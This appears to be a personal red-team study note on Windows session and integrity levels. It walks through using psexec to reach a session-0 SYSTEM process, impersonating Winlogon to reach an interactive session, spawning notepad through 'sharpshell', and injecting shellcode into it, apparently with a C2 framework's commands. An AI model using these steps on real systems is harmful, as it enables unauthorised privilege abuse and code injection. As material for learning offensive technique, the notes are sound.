---
title: Integrity and Session IDs
updated: 2023-11-03 06:15:19Z
created: 2023-11-03 04:14:18Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---

## Integrity and Session IDs
**Concept**: Try to move from a session level "0" process to a sessions level "3" ("1" in windows)

1. Use **psexec** to get access to a session "0" process running as  SYSTEM user
`psexec localhost servicebinary`
![4a5704934b7e7ab542fd97d1588a5e63.png](../../../_resources/4a5704934b7e7ab542fd97d1588a5e63.png)

2. Impersonate Winlogon to get a session "1" session running as 
`ImpersonateProcess <process_number>`
![dfabe7449381cc8034a3bea9a6667cd6.png](../../../_resources/dfabe7449381cc8034a3bea9a6667cd6.png)
3.Generate notepad from the session 1 session
`sharpshell var target = System.Diagnostics.Process.Start("notepad"); return target.Id.ToString();`
4. Inject shellcode into notepad
`Inject /processid:"<notepad_process_id>"`




